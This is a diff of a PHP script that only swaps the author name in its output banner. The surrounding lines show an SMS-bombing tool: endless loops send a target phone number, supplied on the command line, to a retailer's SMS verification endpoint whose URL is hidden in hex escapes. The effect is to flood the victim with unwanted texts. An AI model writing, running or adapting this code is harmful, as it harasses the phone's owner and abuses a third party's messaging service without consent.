@@ -161,7 +161,7 @@ if(is_numeric($argv[1])) {
 
 	while(1) {
 
-		echo "[]Mr.ARDI Sending Massage To[] # ".$G.$argv[1].$X."\n";	
+		echo "[]Mhmmd Sending Massage To[] # ".$G.$argv[1].$X."\n";	
 
 		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
 
@@ -193,7 +193,7 @@ while(1) {
 
 foreach($argv[1] as $argv[2]):
 
-echo "[]Mr.ARDI Sending Massage To[] # ".$G.$argv[2].$X."\n";
+echo "[]Mhmmd Sending Massage To[] # ".$G.$argv[2].$X."\n";
 
 	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");
 
